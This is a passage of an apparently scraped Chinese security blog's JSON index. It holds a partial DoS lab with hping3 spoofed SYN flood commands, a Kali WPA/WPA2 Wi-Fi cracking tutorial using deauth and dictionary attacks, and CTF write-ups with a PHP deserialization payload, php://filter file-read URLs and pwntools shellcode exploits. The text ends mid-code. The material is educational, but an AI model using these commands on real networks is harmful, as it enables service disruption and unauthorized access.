10.3.248.120 目标主机收到大量ICMP包 此时，访问目标网站，会无法访问或者出现很大的延迟。 5、 TCP SYN FLOOD 利用kali下的hping3工具，攻击主机输入命令hping3 -q -n -a 10.3.39.27 -S -s 53 --keep -p 8888 --flood 10.3.248.120 目标主机收到大量的SYN握手包，此时web服务器再次崩溃，甚至web服务都无法停止，停止攻击之后，一段时间之后才可以停止。","categories":[{"name":"Other","slug":"Other","permalink":"http://example.com/categories/Other/"}],"tags":[]},{"title":"kali破解WiFi密码(wpa/wpa2)","slug":"其他/kali破解WiFi密码-wpa-wpa2","date":"2019-05-10T12:35:44.000Z","updated":"2019-05-10T13:03:03.884Z","comments":true,"path":"2019/05/10/其他/kali破解WiFi密码-wpa-wpa2/","link":"","permalink":"http://example.com/2019/05/10/%E5%85%B6%E4%BB%96/kali%E7%A0%B4%E8%A7%A3WiFi%E5%AF%86%E7%A0%81-wpa-wpa2/","excerpt":"前言物联网安全实践一","text":"前言物联网安全实践一 正文这个是破解wpa/wpa2的，wep的另找办法，比较简单。 无线网卡连接先要连接USB网卡，点击虚拟机—设置—USB控制器，设置如下， 查看右下角边框的usb显示，是否连接，未如连接，则点击右键，链接，连接成功如下显示 还有，保证这个已连接，设置完成。 无线网卡配置连接好之后，通过iwconfig查看无线网卡工作是否正常，下面说明是正常的。 设置监听模式使用aircrack-ng工具的airmon-ng来启动监听模式，在使用前先清理阻碍的进程，命令 airmon-ng check kill airmon-ng start wlan0 当wlan0后面有个mon时，说明monitor监听模式成功启动。 抓取握手包使用airodump-ng wlan0mon来扫描网络，如图.之后会开始扫描 命令参数： bssid是ap（access point）的mac地址，在这里ap为路由器 pwr代表信号水平，信号只越高说明距离越近，但是注意， -1值说明无法监听 ch表示工作的信道号 enc表示算法加密体系 cipher表示检测到的加密算法 auth表示认证协议 essid即ssid号,wifi的名称 station表示客户端的mac地址（ctrl-c停止扫描） 5、抓取握手包，从上一步扫描到的结果中选定目标，留意bssid和ch，使用命令 airodump-ng -c 11 --ivs -w test --bssid 74:C3:30:12:DF:D2 wlan0mon 参数：-c 选取频道号 –ivs -w test 保存ivs格式的包，名字为test –bssid 要破解ap的ssid 注意 我们只有一般的数据包，是无法进行密码破解的，我们需要的是用户连接WiFi时的握手包。 在上面的图中，出现这个信息，说明成功抓到了握手包 但是，我们不一定每次都能正好抓到这个包，所以，我们需要使用一个叫aireplay-ng的工具，它可以强制用户断开wifi连接； 原理是，给连接到wifi的一个设备发送一个deauth（反认证）包，让那个设备断开wifi，随后它自然会再次连接wifi。 aireplay-ng的生效前提是，wifi网络中至少有一个连接的设备。从上图可以看到哪些设备连接到了wifi，STATION就是连接设备的MAC地址，记住一个。打开新终端执行： aireplay-ng -0 10 -a 74:C3:30:12:DF:D2 -c 90:F0:52:70:F7:13 wlan0mon 参数：-0指定发送反认证包的个数 -a指定无线路由器BSSID -c指定强制断开的设备。 直到出现上面的信息(红色框框)，说明成功抓到握手包，Ctrl+c结束。 抓到握手包后，就可以结束监控模式了 用字典爆破密码开始破解密码，执行如下的命令，就可以看到已经破解出密码，如果密码复杂一点，可能需要的时间。aircrack-ng -w 字典 保存的包 aircrack-ng -w /root/wifi.txt /root/test-01.ivs（要使用绝对路径） wifi.txt是爆破字典，test-01.ivs是抓的包的文件 成功得到密码。 错误警告1、实验过程中USB网卡可能检测不到，看看型号问题 2、检测到了网卡了，但是不显示WiFi的网络适配器，看看驱动问题 3、检测到网卡，也有WiFi设置，但是检测不到WiFi信号，输入命令service NetworkManager start，还检测不到信号，说明NetworkManager故障，重装虚拟机。 个人见解。。。。。。 参考文章","categories":[{"name":"IoT","slug":"IoT","permalink":"http://example.com/categories/IoT/"}],"tags":[{"name":"IoT","slug":"IoT","permalink":"http://example.com/tags/IoT/"},{"name":"wifi密码破解","slug":"wifi密码破解","permalink":"http://example.com/tags/wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"}]},{"title":"ISCC_2019","slug":"大学CTF/ISCC-2019","date":"2019-05-02T14:21:13.000Z","updated":"2021-05-23T10:24:02.881Z","comments":true,"path":"2019/05/02/大学CTF/ISCC-2019/","link":"","permalink":"http://example.com/2019/05/02/%E5%A4%A7%E5%AD%A6CTF/ISCC-2019/","excerpt":"前言过来划划水","text":"前言过来划划水 正文web4123456789101112131415161718192021222324 &lt;?phperror_reporting(0);include(&quot;flag.php&quot;);$hashed_key = &#x27;ddbafb4eb89e218701472d3f6c087fdf7119dfdd560f9d1fcbe7482b0feea05a&#x27;;$parsed = parse_url($_SERVER[&#x27;REQUEST_URI&#x27;]);if(isset($parsed[&quot;query&quot;]))&#123; $query = $parsed[&quot;query&quot;]; $parsed_query = parse_str($query); if($parsed_query!=NULL)&#123; $action = $parsed_query[&#x27;action&#x27;]; &#125; if($action===&quot;auth&quot;)&#123; $key = $_GET[&quot;key&quot;]; $hashed_input = hash(&#x27;sha256&#x27;, $key); if($hashed_input!==$hashed_key)&#123; die(&quot;&lt;img src=&#x27;cxk.jpg&#x27;&gt;&quot;); &#125; echo $flag; &#125;&#125;else&#123; show_source(__FILE__);&#125;?&gt; parse_url本函数解析一个 URL 并返回一个关联数组，包含在 URL 中出现的各种组成部分。 parse_str — 将字符串解析成多个变量","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"}],"tags":[]},{"title":"CUMT双月赛三","slug":"大学CTF/CUMT双月赛三","date":"2019-05-01T01:20:50.000Z","updated":"2019-05-09T09:56:05.529Z","comments":true,"path":"2019/05/01/大学CTF/CUMT双月赛三/","link":"","permalink":"http://example.com/2019/05/01/%E5%A4%A7%E5%AD%A6CTF/CUMT%E5%8F%8C%E6%9C%88%E8%B5%9B%E4%B8%89/","excerpt":"前言2019年5月 By 窝不管窝的flag都队 考试周的月赛，也得做做看看，划水","text":"前言2019年5月 By 窝不管窝的flag都队 考试周的月赛，也得做做看看，划水 正文web签到1 直接试试http://202.119.201.199:30100/index.php?page=php://filter/read=convert.base64-encode/resource=cxk.php 得到一串base64编码 PD9waHAgDQpwaHBpbmZvKCk7IA0KLypmbGFne0N1bXRDVEZfdGhpc19pU19hX1JFbEx5X2ZMYUchISF9Ki8NCj8+DQo= 解密，得到flag Web签到2考察反序列化漏洞的知识，给出源码： 12345678910111213141516171819202122232425262728293031&lt;?phpinclude &#x27;flag.php&#x27;;error_reporting(0);highlight_file(__FILE__);class P &#123; private $var; function __invoke()&#123; eval( &#x27;global &#x27;.$this -&gt; var.&#x27;;&#x27;. &#x27;$ret = &#x27;.$this -&gt; var.&#x27;;&#x27; ); return $ret; &#125;&#125;class K &#123; protected $fn; public $name; function __toString()&#123; $fn = $this -&gt; fn; return $fn(); &#125;&#125;class U &#123; public $obj; function __wakeup()&#123; if (!isset($this-&gt;obj-&gt;name) || $this-&gt;obj-&gt;name != &quot;iv4n&quot;) &#123; $this -&gt; obj -&gt; fn = function()&#123;&#125;; &#125; &#125;&#125;echo unserialize($_POST[&#x27;obj&#x27;])-&gt;obj; 分析： 三个类分别是P，K，U； P 中 $var，权限为 private，魔术方法 __invoke()，当尝试以调用函数的方式调用一个对象时，方法会被自动调用； K 中 $fn、$name，权限为 protected，魔术方法 __toString()，将 $fn 以函数方式返回 $fn()；到这里就会想到上面的 invoke()，那这里的 $fn 就肯定是 P 的一个对象； U 中 $obj，魔术方法 __wakeup()，要求 $this-&gt;obj-&gt;name == &quot;iv4n&quot;； bypass1想到绕过 __wakeup()，但是要求可以达到，就直接 new 一个 U 的对象，将对象中的数据成员 $obj 赋值为一个K 的对象，将此对象的 $name 赋值为 iv4n 即可，其实不算绕过(手动狗头)； bypass2接下来就是如何调用到 $fn，这里需要注意的是变量的权限问题，这里为 protected，但是在外面无法赋值，这里写个脚本做个测试： 脚本： 123456789&lt;?phpclass run&#123; private $kk1=&#x27;$flag&#x27;; protected $kk2=&#x27;b&#x27;; public $kk3=&#x27;c&#x27;;&#125;$gardenia1=new run();echo (serialize($gardenia1));?&gt; 输出： 显而易见，在序列化的时候： private变量改为了 0x00类名0x00变量，在此基础上字符数量也需要修改； protected变量改为了 0x00*0x00变量，在此基础上字符数量同样需要修改； bypass3此时就可以直接看 __invoke() 函数了，因为包含了flag.php，所以猜想里面存在变量 $flag，所以在 eval() 内执行如下语句： 1eval(global $flag;$ret=$flag;); 将 $flag 转化为全局变量，直接赋值 $ret，输出即可得到flag； exp：123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpclass P &#123; public $var=&#x27;$flag&#x27;; function __invoke()&#123; eval( &#x27;global &#x27;.$this -&gt; var.&#x27;;&#x27;. &#x27;$ret = &#x27;.$this -&gt; var.&#x27;;&#x27; ); return &#x27;invoke&#x27;; &#125;&#125;//返回fn()class K &#123; public $fn; public $name; function __toString()&#123; $fn = $this -&gt; fn; return $fn; &#125;&#125;class U &#123; public $obj; function __wakeup()&#123; if (!isset($this-&gt;obj-&gt;name) || $this-&gt;obj-&gt;name != &quot;iv4n&quot;) &#123; $this -&gt; obj -&gt; fn = function()&#123;&#125;; &#125; &#125;&#125;$gardenia1=new P();$gardenia2=new K();$gardenia2-&gt;fn=$gardenia1;$gardenia2-&gt;name=&#x27;iv4n&#x27;;$gardenia3=new U();$gardenia3-&gt;obj=$gardenia2;$res=serialize($gardenia3);echo($res); 得到： 1O:1:&quot;U&quot;:1:&#123;s:3:&quot;obj&quot;;O:1:&quot;K&quot;:2:&#123;s:2:&quot;fn&quot;;O:1:&quot;P&quot;:1:&#123;s:3:&quot;var&quot;;s:5:&quot;$flag&quot;;&#125;s:4:&quot;name&quot;;s:4:&quot;iv4n&quot;;&#125;&#125; 按照上面的修改即可得到 poc： 1obj=O:1:&quot;U&quot;:1:&#123;s:3:&quot;obj&quot;;O:1:&quot;K&quot;:2:&#123;s:5:&quot;%00*%00fn&quot;;O:1:&quot;P&quot;:1:&#123;s:6:&quot;%00P%00var&quot;;s:5:&quot;$flag&quot;;&#125;s:4:&quot;name&quot;;s:4:&quot;iv4n&quot;;&#125;&#125; 得到 flag： Reverse签到拖进 IDA，F5 看看，主函数： 123456789101112131415161718pattern = 4180;v6 = 8299;v7 = 12378;v8 = 16431;v9 = 20498;v10 = 24663;v11 = 28742;v12 = 33000;v13 = 37073;v14 = 41164;printf(aS, aPleaseInputFla);scanf(aS, &amp;input);if ( strlen(&amp;input) &lt;= 20 &amp;&amp; sub_401000(&amp;input, &amp;pattern) )&#123; printf(aFlagS, &amp;input); system(aPause); exit(0);&#125; 这些变量都是 int 类型的，占 4 B。由 if 语句我们可以知道： 输入长度不能大于 20 sub_401000(&amp;input, &amp;pattern) 返回值应为 1 看看 sub_401000() 函数： 123456789101112131415161718signed int __cdecl sub_401000(const char *input, _BYTE *pattern)&#123; unsigned int i; // edx _BYTE *pp; // esi i = 0; if ( strlen(input) == 0 ) return 1; pp = pattern; while ( (pp[1] ^ input[i]) == *pp ) &#123; ++i; pp += 4; if ( i &gt;= strlen(input) ) return 1; &#125; return 0;&#125; 过程很简单，就是判断 pattern[i] = pattern[i+1]^input[i] 是否成立，根据异或运算的性质，我们容易推出：input[i]=pattern[i]^pattern[i+1]，那就很容易写出 Python 脚本： 1234567891011#coding=utf-8data = [4180,8299,12378,16431,20498,24663,28742,33000,37073,41164]flag = &quot;&quot;for x in data: a = x//256 b = x%256 flag += chr(a^b)flag = &quot;flag&#123;&quot;+flag+&quot;&#125;&quot;print flag 运行结果： 1flag&#123;DKjoB76hAl&#125; Pwn签到where写入可执行 bss 段。栈溢出。 howret2shellcode。 exp12345678910111213from pwn import *#p = remote(&#x27;202.119.201.199&#x27;, 59991)p = process(&#x27;./q&#x27;)context.clear(arch=&#x27;i386&#x27;)shellcode = asm(shellcraft.sh())buf2 = 0x0804C060payload = p32(buf2+4) + shellcode.ljust((0x64-8-4), &#x27;A&#x27;) + p32(buf2+4)#gdb.attach(p)p.sendline(payload)p.interactive() pwn3where写name至可执行bss段。 存在栈溢出。 howret2shellcode exp123456789101112from pwn import *p = remote(&#x27;202.119.201.199&#x27;, 59993)#process(&#x27;./pwn3&#x27;)context.clear(arch=&#x27;amd64&#x27;)shellcode = asm(shellcraft.sh())p.recvuntil(&#x27;:&#x27;)p.sendline(asm(&#x27;jmp rsp&#x27;))p.recvuntil(&#x27;&gt;&#x27;)p.sendline(&#x27;1&#x27;)p.sendline(&#x27;A&#x27;*(0x20+8) + p64(0x6020a0) + shellcode)p.interactive() Crypto古典密码签到一看就是 Hex 编码，直接 Hackbar 解码： 12密文：juttaigykhpmjyreca密钥：cumt 一个密文，一个密钥，古典密码，猜测是维吉尼亚密码。然后直接在线解下 1flag&#123;hahayoufindtheflag&#125; 现代密码签到密文一看就是 bas64 编码，密钥我原来以为就是就是那个，数了下有 16 个字符，那就是 128 bit，尝试 AES、3DES、RC4 解密均失败。后来才发现是经过两次 base64 编码的结果。后来数了下，密文是 26 个字符，不是 8 的整数倍那种，猜测是序列密码，序列密码最常见的是 RC4，所以先试试 RC4解密，直接用 pycrypto 解密，： 1234567891011121314#-*- coding:utf-8 -*-#Stream Cipher: RC4import base64from Crypto.Cipher import ARC4s = &quot;zSLWE5Fk7Sg3mlltw9l2N7dhuADvk2HvWYU=&quot;k = &quot;WTNWdGRHWnNZV2M9&quot;s = base64.b64decode(s)k = base64.b64decode(base64.b64decode(k))print len(s)print krc4 = ARC4.new(k)plaintext = rc4.decrypt(s)print plaintext 运行结果： 12326cumtflagflag&#123;CumT_D0uB13_MooN_cTf&#125; easyxor有 hint 后是送分题，直接上 Python 脚本： 1234567891011121314151617181920212223242526#coding=utf-8import libnumflag = &#x27;flag&#123;**************************&#125;&#x27;def crypt(n): msg = libnum.s2n(n) k = 0 for i in bin(msg)[2:]: k = k &lt;&lt; 1 if int(i): k = k ^ msg if k &gt;&gt; 256: k = k ^ 0x10000000000000000000000000000000000000000000000000000000000000365 # return str(k) return libnum.n2s(k)s = 113493740270492087381619361102311635177554834526932164090282635858419073655670s = libnum.n2s(s)cnt = 1while True: print str(cnt)+&quot; try:&quot; s = crypt(s) if &quot;flag&quot; in s: print(s) break cnt += 1 结果： 1flag&#123;ec33f669d2d659e2bc27dbffdf&#125; encode给了一个 .pyc 文件，这里用到一个在线网站反编译：https://tool.lu/pyc/ 稍微看下代码，直接写出对应编码函数的逆函数即可： 123456789101112131415161718192021222324#!/usr/bin/env python# encoding: utf-8import base64def decode1(ans): ret = &quot;&quot; for x in ans: y = ord(x)-25 ret += chr(y^36) return retdef decode2(ans): ret = &quot;&quot; for x in ans: y = ord(x)^36 y -= 36 ret += chr(y) return retdef decode3(ans): return base64.b32decode(ans)final = &#x27;LOQ2NJFYU5YH2WTUU5VHJIDXLJNVW2LQO52WS2L6PVUVW2TQLJNVSWLJUBN3E===&#x27;print decode1(decode2(decode3(final))) 运行结果： 1flag&#123;b38e7b57c2eff432044984f53efdd4cf&#125; RSA题目给了一个 .pem 文件，里面有公钥信息： 123456789-----BEGIN PUBLIC KEY-----MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKBgQKBPJR+6zDQPEK6ZY+xAdHS/Sw69BJG2IrKGOMQ7mk6vdpFlR0F2ZuqiYy6MEXG+KDv9yCrayeV0Yw+JwoNozIBrTl74KXVk84FHmn6iYQceqtGjcb2frmkID0SBXgNBti1CNUOe/v6GeyXl0j3JPmnB1wy9BldH3vSS9FJr6DGIwKBgQGtbGUOVzO5qyoOMo+/bdqnxqA4NHjUciH+GDaUyKgjp4X47PFyHYc6HI0tyMmjxmo/nUXV7MTGVnk2lYoLuuSM8aNWyBgCdGf0bVxwUtmMyDqr6Z7GL6djTSiUtWIyi0duMsGrPPxOTfZRkbVgj/r0OopZIDbc+zDxHsNUwl2PXQ==-----END PUBLIC KEY----- 看起来像 base64 ，应该这个文件还有一定结构，直接在线 decoder 解析下，链接：https://report-uri.com/home/pem_decoder。 发现这 e 很大呀，推测可以用低解密指数攻击（wiener attack），直接用 github 上别人的板子，链接：https://github.com/pablocelayes/rsa-wiener-attack。 写如下 Python 脚本： 1234567891011121314151617181920212223242526272829303132333435363738#coding=utf-8import syssys.setrecursionlimit(10000000)import ContinuedFractions, Arithmetic, RSAvulnerableKeyGeneratorimport libnumdef hack_RSA(e,n): &#x27;&#x27;&#x27; Finds d knowing (e,n) applying the Wiener continued fraction attack &#x27;&#x27;&#x27; frac = ContinuedFractions.rational_to_contfrac(e, n) convergents = ContinuedFractions.convergents_from_contfrac(frac) for (k,d) in convergents: #check if d is actually the key if k!=0 and (e*d-1)%k == 0: phi = (e*d-1)//k s = n - phi + 1 # check if the equation x^2 - s*x + n = 0 # has integer roots discr = s*s - 4*n if(discr&gt;=0): t = Arithmetic.is_perfect_square(discr) if t!=-1 and (s+t)%2==0: print(&quot;Hacked!&quot;) return dn = 0x02813c947eeb30d03c42ba658fb101d1d2fd2c3af41246d88aca18e310ee693abdda45951d05d99baa898cba3045c6f8a0eff720ab6b2795d18c3e270a0da33201ad397be0a5d593ce051e69fa89841c7aab468dc6f67eb9a4203d1205780d06d8b508d50e7bfbfa19ec979748f724f9a7075c32f4195d1f7bd24bd149afa0c623e = 0x01ad6c650e5733b9ab2a0e328fbf6ddaa7c6a0383478d47221fe183694c8a823a785f8ecf1721d873a1c8d2dc8c9a3c66a3f9d45d5ecc4c6567936958a0bbae48cf1a356c818027467f46d5c7052d98cc83aabe99ec62fa7634d2894b562328b476e32c1ab3cfc4e4df65191b5608ffaf43a8a592036dcfb30f11ec354c25d8f5df = open(&quot;flag.enc&quot;,&quot;rb&quot;)c = f.read()c = libnum.s2n(c)d = hack_RSA(e,n)m = pow(c,d,n)print libnum.n2s(m) 运行结果前面还有一堆奇奇怪怪的字符，在后面我们看到了 flag ヾ(*・-・)ﾂ： 1flag&#123;62fe8a611728ca62b6a7cba837abacae&#125; MiscWhoami???打开题目进入懵逼状态： 疯狂乱试都失败了。 F12 检查，转到【Network】标签看到： 好了，知道你是茶壶了，遂填入 teapot 得到 flag 。等等，今天是劳动节不是愚人节呀！ Lisp先学一波语言define宏定义。 append列表连接。 pair有序数对，包含两个元素。 letlet 是一个最常用的 Common Lisp 的操作符之一，它让你引入新的局部变量（local variable）： 123&gt; (let ((x 1) (y 2)) (+ x y))3 car &amp; cdr取出列表元素的基本函数是 car 和 cdr 。对列表取 car 返回第一个元素，而对列表取 cdr 返回第一个元素之后的所有元素： 1234&gt; (car &#x27;(a b c))A&gt; (cdr &#x27;(a b c))(B C) 你可以把 car 与 cdr 混合使用来取得列表中的任何元素。如果我们想要取得第三个元素，我们可以： 12&gt; (car (cdr (cdr &#x27;(a b c d))))C cond语法是 ： 1234(cond (test1 action1) (test2 action2) ... (testn actionn)) cond语句中的每个子句都包含条件测试和要执行的操作。类似 C 中的带 break 的 switch 。 如果cond，test1之后的第一个测试被评估为true，则执行相关的动作部分action1，返回其值，并跳过其余的子句。 如果test1的计算结果为nil，则控制将移至第二个子句而不执行action1，并遵循相同的过程。 如果没有任何测试条件被评估为真，则cond语句返回nil。 remainder取余。 理解代码然后对照着 Lisp 代码改写成 Python 代码： 123456789101112131415tab = [97,100,206,218,135,230,70,242,104,107,95,104,97,107,100,206,101,218,137]iv_0 = 0x0civ_1 = 0x2eiv_2 = 0x3adef conv(i): if i%3 == 1: return i*2+iv_0 elif i%2 == 0: return i/2+iv_1 elif i &gt; 90: return i+iv_0 else: return i+iv_2 Exploit now!写出 conv() 的逆函数，并结合正则表达式给的范围写出脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445#!/usr/bin/env python#coding=utf-8tab = [97,100,206,218,135,230,70,242,104,107,95,104,97,107,100,206,101,218,137]legal = r&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_&#123;&#125;&quot;iv_0 = 0x0civ_1 = 0x2eiv_2 = 0x3adef conv(i): if i%3 == 1: return i*2+iv_0 elif i%2 == 0: return i/2+iv_1 elif i &gt; 90: return i+iv_0 else: return i+iv_2def uncov(i): if (i-iv_0)%2 == 0 and ((i-iv_0)/2)%3 == 1 and chr((i-iv_0)/2) in legal: return (i-iv_0)/2 if i-iv_0 &gt; 90 and chr(i-iv_0) in legal: return i-iv_0 if chr(i-iv_2) in legal: return i-iv_2 return ord(&quot;;&quot;)def uncov_2(i): if (i-iv_1)*2 &lt; 256 and chr((i-iv_1)*2) in legal: return (i-iv_1)*2 return ord(&quot;;&quot;)flag = &quot;&quot;flag2 = &quot;&quot;l = len(tab)for i in range(l): flag += chr(uncov(tab[i])) flag2 += chr(uncov_2(tab[i]))print flagprint flag2 运行结果： 12;;ag&#123;m;s;_;;;_;a;g&#125;fl;;;;0;tzbtfzl;n;; 然后手动七拼八凑拼成有意义的结果： 1flag&#123;m0st_btf_lang&#125; 猜？题目给了一个加密的 .zip 文件，让我们猜密码？推测可能用了弱密钥，先不管三七二十一跑下字典。用工具秒破： 解压看到里面一张图片： 试试 LSB 隐写： 真真假假给了一个压缩包，试试解压，但是需要密码。从题目推测可能是伪加密，拖到 Linux 下直接解压成功，有一个 img.html 文件，打开是一堆像是 base64 编码的字符。我们推测是一张图片，直接写个 Python 脚本将字符转成文件： 1234567import osimport base64sss = &quot;&quot;#那一堆字符data = base64.b64decode(sss)file = open(&#x27;1&#x27;,&quot;wb&quot;)file.write(data)file.close() 使用 file 命令看看文件是什么格式： 12λ file 11: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, Exif Standard: [TIFF image data, big-endian, direntries=6, orientation=upper-left, software=Adobe Photoshop 7.0, datetime=2009:11:25 21:24:19], baseline, precision 8, 550x550, frames 3 那我们加上扩展名 .jpg，打开看看，再看看属性： 发现备注有看起来像 base64 编码的字符串，在线解下得到： 1flag&#123;h311o_tH1s_1S_f14g&#125;","categories":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/categories/ctf/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"CUMT双月赛三","slug":"CUMT双月赛三","permalink":"http://example.com/tags/CUMT%E5%8F%8C%E6%9C%88%E8%B5%9B%E4%B8%89/"}]},{"title":"记攻防世界几个有意思的MISC","slug":"大学CTF/记攻防世界几个有意思的MISC","date":"2019-04-25T01:31:34.000Z","updated":"2019-04-25T03:04:53.965Z","comments":true,"path":"2019/04/25/大学CTF/记攻防世界几个有意思的MISC/","link":"","permalink":"http://example.com/2019/04/25/%E5%A4%A7%E5%AD%A6CTF/%E8%AE%B0%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%87%A0%E4%B8%AA%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84MISC/","excerpt":"前言看看攻防世界的MISC，碰到几个有意思的。","text":"前言看看攻防世界的MISC，碰到几个有意思的。 正文如来十三掌得到一个Word文档，打开之后是一串，，，感觉是经文的东西。检查了各种属性之后一无所获，无从下手啊。只能百度，让我了解到了与佛论禅这个东西，把那一段文字复制到下面，在前面加一个“佛曰：”，然后点击2， 就得到一串密文，开始以为是base64，解密之后没用，才发现是rot13，这才明白你这个题目名字的意义：如来十三掌，rot13解密后，得到ZmxhZ3tiZHNjamhia3ptbmZyZGhidmNraWpuZHNrdmJramRzYWJ9，还是密文，base64解密，得到flag gif拿到一个压缩包，解压之后，得到一堆图片 其他信息没有，黑色和白色容易让人联想到二进制的0,1.把白色当成1，黑色当成0，那么前八位为10011001，显然不对，把黑色当成1，白色当成0，为01100110，对应为f，猜测正确，然后全部读出来，python脚本 12345import osflag_binary=&#x27;读出来的二进制&#x27;for i in range(len(flag_binary)/8): flag += chr(int(flag_binary[i*8:(i+1)*8],2))print flag 看了writeup的脚本： 1234567891011121314151617181920import oswhite = open(&quot;0.jpg&quot;, &quot;rb&quot;).read() black = open(&quot;1.jpg&quot;, &quot;rb&quot;).read()flag_binary = &quot;&quot;for i in range(104): with open(&quot;%d.jpg&quot;%i,&quot;rb&quot;) as f: if f.read() == white: flag_binary += &quot;0&quot; else: flag_binary += &quot;1&quot;flag = &quot;&quot;for i in range(len(flag_binary)/8): flag += chr(int(flag_binary[i*8:(i+1)*8],2))print flag SimpleRar使用winhex修改文件头A8 3C 7A -&gt; A8 3C 74 保存后解压sercet.png 使用winhex打开sercet.png发现文件头为gif图，后缀改为.gif 使用提取photoshop查看secret.gif后发现两个图层，分别取出用stegsolve查看 拼接后得到完整二维码扫描得到flag","categories":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/categories/ctf/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"攻防世界MISC","slug":"攻防世界MISC","permalink":"http://example.com/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CMISC/"}]},{"title":"第十二届全国大学生安全竞赛","slug":"大学CTF/第十二届全国大学生安全竞赛","date":"2019-04-23T07:38:27.000Z","updated":"2021-05-23T10:27:57.143Z","comments":true,"path":"2019/04/23/大学CTF/第十二届全国大学生安全竞赛/","link":"","permalink":"http://example.com/2019/04/23/%E5%A4%A7%E5%AD%A6CTF/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/","excerpt":"前言上周末刚打完的比赛，就得了200多分","text":"前言上周末刚打完的比赛，就得了200多分 正文Misc签到题题目叫“三人行必有flag”，三个人站在摄像头前面，就可以拿到flag了。 flag{87e37d95-6a48-4463-aff8-b0dbd27d3b7d} saleae第一次见到这样的题，在百度上找了好久，也没找到个靠谱的教程，下载了logic后也不会用，不会分析数据，这道题完全是手刷的，按照下面这样读出来的 然后一个一个转化成十六进制，再转字符串。注意：二进制串顺序是逆序。 期间错了几次，改了好几次才改对。 flag{12071397-19d1-48e6-be8c-784b89a95e07} 后来才知道正确的做法，点击Analyze–&gt;SPI 设好时钟脉冲和数据脉冲，没有的设成None 开始输入的是二进制，然后转换成ascii 得到flag 24c这道题没法用手刷，读出来，所以当时没做出来，现在看看，好简单啊，，，， 题目是24c，这次选择I2c，直接save 再转成ascii，看到flag 但是这里，不是简单地拼接字符串就对的，而是有一定的拼接规则。具体的百度吧，我也不懂这个。 badusb和第一题一样，SPI分析，设置如下： 在最下面找到flag Cryptopuzzlepuestion0 解这个四元一次方程组，用python的numpy库 1234567891011121314import numpya=[[13627,26183,35897,48119],[23027,38459,40351,19961],[36013,45589,17029,27823],[43189,12269,21587,33721]]b=[347561292,361760202,397301762,350830412]a=numpy.array(a)b=numpy.array(b)result=numpy.linalg.solve(a,b)print result 或者是z3库 要求转成十六进制后拼接，得到fa6bed9c7a00 question1 这是一个素数序列找规律的题目，在26000000与26500000素数中每间隔固定个数取一个值（间隔是36个），全部的素数序列网站如下 http://smallprimenumber.blogspot.com/2008/12/prime-number-from-26000000-to-26500000.html 只要按照该规则寻找即可： 26364803 26364809 26364823 26364827 26364847 26364881 26364889 26364893 26364901 26364931 26364941 26364967 26364983 26364991 26364997 26365007 26365021 26365037 26365039 26365049 26365057 26365081 26365099 26365109 26365111 26365123 26365133 26365139 26365169 26365177 26365187 26365231 26365243 26365289 26365301 26365333 26365363 26365393 26365399 26365403 26365421 26365463 26365511 26365517 26365519 26365523 26365541 26365561 26365601 26365607 26365621 26365643 26365649 26365681 26365721 26365733 26365741 26365771 26365777 26365783 26365789 26365799 26365811 26365817 26365819 26365873 26365877 26365883 26365891 26365909 26365943 26365987 26365991 26366003 26366023 26366033 26366059 26366071 26366077 26366117 26366141 26366147 26366149 26366159 26366173 26366189 26366203 26366227 26366231 26366233 26366273 26366287 26366317 26366323 26366341 26366369 26366383 26366393 26366407 26366419 26366429 26366447 26366453 26366477 26366491 26366497 26366503 26366537 26366551 26366581 26366591 26366603 26366621 26366633 26366663 ∴Part1 = 26365399 十六进制1924dd7 question2,3,4 数学和物理的知识了 第一就是简单的求极限和积分。 part2=(1+91+7+1)*77=7700 转换十六进制 part2=1e14 第三题是一道物理题目 代入数据，最后得到结果part3=18640十六进制 48d0 第四题考的是三重积分 求得part4=40320 ，十六进制part4=9d80 拼接得到flag：flag{01924dd7-1e14-48d0-9d80-fa6bed9c7a00} WebJustsoso知识点：任意文件读取，PHP 反序列化 查看源码，发现有hint.php，/?file=php://filter/read=convert.base64-encode/resource=hint.php，读取hint.php源码看看，base64解码后 1234567891011121314151617181920212223242526272829303132333435&lt;?php error_reporting(0);class Handle&#123; private $handle; public function __wakeup()&#123; foreach(get_object_vars($this) as $k =&gt; $v) &#123; $this-&gt;$k = null; &#125; &#125; public function __construct($handle) &#123; $this-&gt;handle = $handle; &#125; public function __destruct()&#123; $this-&gt;handle-&gt;getFlag(); &#125;&#125;class Flag&#123; public $file; public $token; public $token_flag; function __construct($file)&#123; $this-&gt;file = $file; echo &#x27;__construct&#x27;; $this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000)); &#125; public function getFlag()&#123; $this-&gt;token_flag = md5(rand(1,10000)); if($this-&gt;token === $this-&gt;token_flag) &#123; if(isset($this-&gt;file))&#123; echo @highlight_file($this-&gt;file,true); &#125; &#125; &#125;&#125; /?file=php://filter/read=convert.base64-encode/resource=index.php，读取index.php 1234567891011121314151617181920212223242526272829&lt;html&gt;&lt;?phperror_reporting(0); $file = $_GET[&quot;file&quot;]; $payload = $_GET[&quot;payload&quot;];if(!isset($file))&#123; echo &#x27;Missing parameter&#x27;.&#x27;&lt;br&gt;&#x27;;&#125;if(preg_match(&quot;/flag/&quot;,$file))&#123; die(&#x27;hack attacked!!!&#x27;);&#125;@include($file);if(isset($payload))&#123; $url = parse_url($_SERVER[&#x27;REQUEST_URI&#x27;]); parse_str($url[&#x27;query&#x27;],$query); foreach($query as $value)&#123; if (preg_match(&quot;/flag/&quot;,$value)) 